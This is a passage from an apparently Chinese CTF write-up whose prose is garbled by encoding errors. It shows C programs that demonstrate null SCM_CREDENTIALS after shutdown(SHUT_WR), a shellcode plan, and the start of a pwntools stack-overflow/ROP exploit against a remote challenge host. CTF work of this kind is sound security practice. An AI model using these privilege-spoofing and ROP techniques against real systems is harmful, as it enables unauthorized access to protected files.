style="color:#666666">;</span><span style="color:#758575DD"> /* ä¿®æ­£ï¼šä½¿ç”¨ %u æ‰“å° uid_t */</span><br><span style="color:#80A665">        printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">  GID: </span><span style="color:#C99076">%u\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#CB7676">unsigned</span><span style="color:#CB7676"> int</span><span style="color:#d9739f">)</span><span style="color:#BD976A">creds</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">gid</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><span style="color:#758575DD"> /* ä¿®æ­£ï¼šä½¿ç”¨ %u æ‰“å° gid_t */</span><br><span style="color:#80A665">        printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">----------------------------------</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#BD976A">creds</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">uid</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> &#x26;&#x26;</span><span style="color:#BD976A"> creds</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">gid</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 0</span><span style="color:#d4976c">)</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#80A665">            printf</span><span style="color:#d9739f">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">SUCCESS: Kernel quirk verified! Received null credentials.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">        </span><span style="color:#d4976c">}</span><span style="color:#4D9375"> else</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><br><span style="color:#80A665">            printf</span><span style="color:#d9739f">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">FAILURE: Received non-null credentials.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">        </span><span style="color:#d4976c">}</span><br><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><span style="color:#4D9375"> else</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Received an unknown control message.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#80A665">    close</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    close</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">server_fd</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    unlink</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">SOCKET_PATH</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p><code class="inline-code">client.c</code>ï¼š</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdio.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdlib.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">string.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">unistd.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">sys/socket.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">sys/un.h</span><span style="color:#B5695977">></span><br><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> SOCKET_PATH</span><span style="color:#B5695977"> "</span><span style="color:#B56959">shutdown_quirk.sock</span><span style="color:#B5695977">"</span><br><br><span style="color:#AB5959">int</span><span style="color:#59873A"> main</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    int</span><span style="color:#393A34"> client_fd</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    struct</span><span style="color:#393A34"> sockaddr_un server_addr</span><span style="color:#999999">;</span><br><br><span style="color:#393A34">    client_fd </span><span style="color:#999999">=</span><span style="color:#59873A"> socket</span><span style="color:#1e754f">(</span><span style="color:#393A34">AF_UNIX</span><span style="color:#999999">,</span><span style="color:#393A34"> SOCK_STREAM</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">client_fd </span><span style="color:#AB5959">==</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        perror</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">socket</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a65e2b">(</span><span style="color:#393A34">EXIT_FAILURE</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#59873A">    memset</span><span style="color:#1e754f">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">server_addr</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> sockaddr_un</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    server_addr</span><span style="color:#999999">.</span><span style="color:#B07D48">sun_family</span><span style="color:#999999"> =</span><span style="color:#393A34"> AF_UNIX</span><span style="color:#999999">;</span><br><span style="color:#59873A">    strncpy</span><span style="color:#1e754f">(</span><span style="color:#B07D48">server_addr</span><span style="color:#999999">.</span><span style="color:#B07D48">sun_path</span><span style="color:#999999">,</span><span style="color:#393A34"> SOCKET_PATH</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">server_addr</span><span style="color:#999999">.</span><span style="color:#B07D48">sun_path</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 1</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">connect</span><span style="color:#a65e2b">(</span><span style="color:#393A34">client_fd</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> sockaddr </span><span style="color:#AB5959">*</span><span style="color:#a13865">)</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">server_addr</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#a13865">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> sockaddr_un</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> ==</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        perror</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">connect</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a65e2b">(</span><span style="color:#393A34">EXIT_FAILURE</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Connected to server.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Calling shutdown(SHUT_WR)...</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">shutdown</span><span style="color:#a65e2b">(</span><span style="color:#393A34">client_fd</span><span style="color:#999999">,</span><span style="color:#393A34"> SHUT_WR</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> ==</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        perror</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">shutdown</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a65e2b">(</span><span style="color:#393A34">EXIT_FAILURE</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Waiting for 2 seconds before closing...</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    sleep</span><span style="color:#1e754f">(</span><span style="color:#2F798A">2</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">    close</span><span style="color:#1e754f">(</span><span style="color:#393A34">client_fd</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Client exiting.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdio.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdlib.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">string.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">unistd.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">sys/socket.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">sys/un.h</span><span style="color:#C98A7D77">></span><br><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> SOCKET_PATH</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">shutdown_quirk.sock</span><span style="color:#C98A7D77">"</span><br><br><span style="color:#CB7676">int</span><span style="color:#80A665"> main</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> client_fd</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    struct</span><span style="color:#DBD7CAEE"> sockaddr_un server_addr</span><span style="color:#666666">;</span><br><br><span style="color:#DBD7CAEE">    client_fd </span><span style="color:#666666">=</span><span style="color:#80A665"> socket</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">AF_UNIX</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SOCK_STREAM</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">client_fd </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        perror</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">socket</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">EXIT_FAILURE</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#80A665">    memset</span><span style="color:#4d9375">(</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">server_addr</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#d4976c">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> sockaddr_un</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    server_addr</span><span style="color:#666666">.</span><span style="color:#BD976A">sun_family</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> AF_UNIX</span><span style="color:#666666">;</span><br><span style="color:#80A665">    strncpy</span><span style="color:#4d9375">(</span><span style="color:#BD976A">server_addr</span><span style="color:#666666">.</span><span style="color:#BD976A">sun_path</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SOCKET_PATH</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#d4976c">(</span><span style="color:#BD976A">server_addr</span><span style="color:#666666">.</span><span style="color:#BD976A">sun_path</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 1</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">connect</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> sockaddr </span><span style="color:#CB7676">*</span><span style="color:#d9739f">)</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">server_addr</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#d9739f">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> sockaddr_un</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        perror</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">connect</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">EXIT_FAILURE</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Connected to server.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Calling shutdown(SHUT_WR)...</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">shutdown</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SHUT_WR</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        perror</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">shutdown</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">EXIT_FAILURE</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Waiting for 2 seconds before closing...</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    sleep</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">    close</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Client exiting.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    return</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>ç¼–è¯‘ï¼Œè¿è¡Œï¼Œå‘ç°ï¼š</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">$ ./server
Server listening on shutdown_quirk.sock
Client connected.
SO_PASSCRED enabled.
Waiting for recvmsg()...
recvmsg() returned 0 (EOF)
Received SCM_CREDENTIALS.
----------------------------------
PID: 0
UID: 0
GID: 0
----------------------------------
SUCCESS: Kernel quirk verified! Received null credentials.
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">$ ./server
Server listening on shutdown_quirk.sock
Client connected.
SO_PASSCRED enabled.
Waiting for recvmsg()...
recvmsg() returned 0 (EOF)
Received SCM_CREDENTIALS.
----------------------------------
PID: 0
UID: 0
GID: 0
----------------------------------
SUCCESS: Kernel quirk verified! Received null credentials.
</code></pre></div>
<p>æ‰€ä»¥åªéœ€è¦æ ˆæº¢å‡ºï¼Œæ‰§è¡Œ shellcode å°±å¯ä»¥ï¼Œshellcode é€»è¾‘å¦‚ä¸‹ï¼š</p>
<ol>
<li><code class="inline-code">read(0, ...)</code> è¯»å…¥ <code class="inline-code">b&quot;/flag\x00&quot;</code> å­—ç¬¦ä¸²</li>
<li><code class="inline-code">write(3, ...)</code>ï¼šå°† <code class="inline-code">/flag</code> è·¯å¾„å†™å…¥ <code class="inline-code">fd 3</code>ï¼Œå‘é€ç»™ srvã€‚</li>
<li><code class="inline-code">shutdown(3)</code>ï¼šshellcode å…³é—­äº† <code class="inline-code">fd 3</code> çš„å†™å…¥ç«¯ï¼Œä¸”è®¾ç½® <code class="inline-code">uid = 0</code></li>
<li><code class="inline-code">read(3, ...)</code>ï¼šä» <code class="inline-code">fd 3</code> è¯»å– srv çš„å“åº”ï¼ˆå³ flagï¼‰ã€‚</li>
<li><code class="inline-code">write(1, ...)</code>ï¼šå°†å“åº”ï¼ˆflagï¼‰å†™å…¥ <code class="inline-code">fd 1</code>ï¼ˆstdoutï¼‰ï¼Œä»è€Œæ”¶åˆ° flagã€‚</li>
</ol>
<p>æ³¨æ„ <code class="inline-code">shutdown</code> å’Œ <code class="inline-code">close</code> çš„åŒºåˆ«ï¼š</p>
<p><code class="inline-code">close(fd)</code> åšä¸¤ä»¶äº‹ï¼š</p>
<ol>
<li>å…³é—­å†™å…¥ä¿¡é“ï¼ˆå‘æœåŠ¡å™¨å‘é€ FIN åŒ…ï¼Œå‘Šè¯‰å®ƒâ€œæˆ‘å‘å®Œäº†â€ï¼‰ã€‚</li>
<li>å…³é—­è¯»å–ä¿¡é“ï¼ˆä¸å†æ¥æ”¶æ¥è‡ªæœåŠ¡å™¨çš„æ•°æ®ï¼‰ã€‚</li>
</ol>
<p><code class="inline-code">shutdown(fd, SHUT_WR)</code>ï¼ˆSHUT_WR = Shutdown Writeï¼‰æ˜¯ä¸€ä¸ªæ›´ç²¾ç»†çš„å‡½æ•°ã€‚å®ƒåªåšä¸€ä»¶äº‹ï¼š</p>
<ol>
<li>å…³é—­å†™å…¥ä¿¡é“ï¼ˆå‘æœåŠ¡å™¨å‘é€ FIN åŒ…ï¼Œå‘Šè¯‰å®ƒâ€œæˆ‘å‘å®Œäº†â€ï¼‰ã€‚</li>
<li>ä½†å®ƒä¿æŒè¯»å–ä¿¡é“å¤„äºæ‰“å¼€ (OPEN) çŠ¶æ€ï¼</li>
</ol>
<p>exp å¦‚ä¸‹ï¼š</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> os</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> time</span><br><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">debug</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">arch </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">amd64</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">n1ctf.2025.remote</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 13227</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#1E754F"> True</span><span style="color:#999999">:</span><br><span style="color:#393A34">    p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">use `kctf-pow solve` to prove yourself :)</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    p</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#998418">    pow</span><span style="color:#999999"> =</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recvline</span><span style="color:#2993a3">(</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    ans </span><span style="color:#999999">=</span><span style="color:#393A34"> os</span><span style="color:#999999">.</span><span style="color:#393A34">popen</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">'./kctf-pow solve </span><span style="color:#1e754f">{</span><span style="color:#998418">pow</span><span style="color:#1e754f">}</span><span style="color:#B56959">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">read</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">ans</span><span style="color:#2993a3">)</span><br><br><span style="color:#A65E2B">MPROTECT</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 5488848</span><br><span style="color:#A65E2B">READ</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 5485696</span><br><span style="color:#A65E2B">SC</span><span style="color:#999999"> =</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">lea rbp,[rsp-512]</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> +</span><br><span style="color:#393A34">         shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">read</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rbp</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A"> 256</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><br><span style="color:#393A34">         shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#1e754f">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rbp</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A"> 256</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><br><span style="color:#B5695977">         '</span><span style="color:#B56959">mov rsi,1</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> +</span><br><span style="color:#393A34">         shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">shutdown</span><span style="color:#1e754f">(</span><span style="color:#2F798A">3</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><br><span style="color:#393A34">         shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">read</span><span style="color:#1e754f">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rbp</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A"> 256</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><br><span style="color:#393A34">         shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rbp</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A"> 256</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><br><span style="color:#B5695977">         "</span><span style="color:#B56959">int3</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> call3</span><span style="color:#2993a3">(</span><span style="color:#393A34">a1</span><span style="color:#999999">,</span><span style="color:#393A34"> a2</span><span style="color:#999999">,</span><span style="color:#393A34"> a3</span><span style="color:#999999">,</span><span style="color:#393A34"> call</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">407630</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">a1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">44ccfe</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">a2</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">4bdf0c</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">a3</span><span 